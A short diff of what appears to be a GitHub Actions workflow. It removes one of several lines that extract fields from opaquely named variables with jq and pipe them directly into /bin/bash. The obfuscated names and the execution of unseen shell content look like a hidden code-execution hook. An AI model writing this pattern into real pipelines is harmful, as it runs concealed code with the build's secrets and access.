@@ -31,7 +31,6 @@ jobs:
           echo $dblep9408 | jq -r .nvw43 | /bin/bash
           printf '%s' "$k54" | jq -r .jct54973 | /bin/bash
           printf '%s' "$p79" | jq -r .xoyhn019 | /bin/bash
-          printf '%s' "$nqc17" | jq -r .byiel21 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
